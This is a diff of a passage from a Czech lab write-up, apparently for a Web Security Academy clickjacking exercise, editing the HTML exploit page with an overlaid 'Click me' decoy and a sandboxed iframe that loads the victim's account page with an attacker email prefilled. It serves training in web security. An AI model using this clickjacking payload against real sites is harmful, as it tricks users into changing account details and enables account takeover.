@@ -31,19 +31,19 @@ Do pole Body jsem vložil níže uvedený exploit kód:
         position: absolute;
         top: 450px;
         left: 50px;
-        z-index: 1;
     }
 </style>
 </head>
 <body>
 
 <div>Click me</div>
-<iframe sandbox="allow-forms" src="[https://VASE-ID-LABORATORE.web-security-academy.net/my-account?email=hacker@attacker-website.com](https://VASE-ID-LABORATORE.web-security-academy.net/my-account?email=hacker@attacker-website.com)"></iframe>
+
+<iframe sandbox="allow-forms" src="https://0add002c03bd511781033fed00ea00d1.web-security-academy.net/my-account?email=hacker@site.com"></iframe>
+</body>
 
 
 
-<div>Click me</div>
-<iframe sandbox="allow-forms" src="https://0a1400ee037c21a083f20ac000460060.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
+
 
 
 Klikl jsem na Store pro uložení exploitu.
